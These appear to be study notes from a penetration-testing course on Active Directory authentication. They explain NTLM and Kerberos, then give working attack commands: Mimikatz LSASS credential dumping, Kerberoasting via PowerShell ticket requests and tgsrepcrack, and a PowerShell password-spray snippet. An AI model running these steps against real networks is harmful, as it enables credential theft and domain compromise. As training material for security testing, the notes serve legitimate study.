
2 Types Kerberos and NTLM

### NTLM Auth
* Authenticates via IP instead of hostname
* Uses users pw to calculate hash. 
* Sends usename to server and server sends challenge
* Client encrypts challenge using NTLM hash, responds to server
* Server forwards response along with username  and nonce to Domain Controller
* Domain controller validates bc it knows all hashes.
* Cannot be reversed but can be cracked


### Kerberos Auth
* Uses a ticket based system
* Domain Controller is KDC. Client sends Auth Server Request which is timestamp encrypted using hash.
* DC confirms by decrypting and make sure time stamp is not duplicate.
* DC gives back a session key and Ticket Granting Ticket. Sess key is encrypted using hash. TGT has user info, group memberships, domain, timestamp, IP and sess key, this cannot be decrypted by client.

### Cached Credential Storage
Kerberos = Single sign on, password hashes used are stored in Local Security Authority Subsystem Service (LSASS) memory. These hashes are crackable. 

Can use mimikatz to extract hashes on system.
> For example, execute Mimikatz directly from memory using an injector like PowerShell or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and from there, load the data into Mimikatz

```
mimikatz.exe
privilege::debug # Engage SeDebugPrivilege allows interaction other account process
sekurlsa::logonpasswords # dump creds of all logged on users
sekurlsa::tickets # Dump TGT tickets
```

### Service Account Attacks
Anyone can ask for a service ticket from the domain controller. Domain controlle does not check if user has permissions to access service hoster by SP. This is second step check. 

> If we know SPN we can request service ticket and then crack.

For example, we know that the registered SPN for the Internet Information Services web server in the domain is HTTP/CorpWebServer.corp.com. From PowerShell, we can use the KerberosRequestorSecurityToken class to request the service ticket.

The code segment we need is located inside the System.IdentityModel3 namespace, which is not loaded into a PowerShell instance by default. To load it, we use the Add-Type cmdlet with the -AssemblyName argument.

We can call the KerberosRequestorSecurityToken constructor by specifying the SPN with the -ArgumentList option
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

After exec, ticket should be generated inot memory. Can use klist command to display all cached Kerberos tickets for the current user.

Download Service Ticket: `kerberos::list /export`
This is encrypted with SPN's pw hash. We can decrypt this using Kerberoasting.
Install using apt, then: `python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi`  


### Low and slow password guessing
If account lockout gets triggered from too many attempts, this technique helps with that.
Domains account policy: `net accounts` > lockout threshold and lockout observation window.

Use powershell to make queries in the context of a different user.
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
```
If pw correct, object creation shown. Else, exception saying user/pw is incorrect.
An existing implementation of this attack called Spray-Passwords.ps11 is located in the `C:\Tools\active_directory` folder of the Windows 10 client. Can test admin with -Admin flag.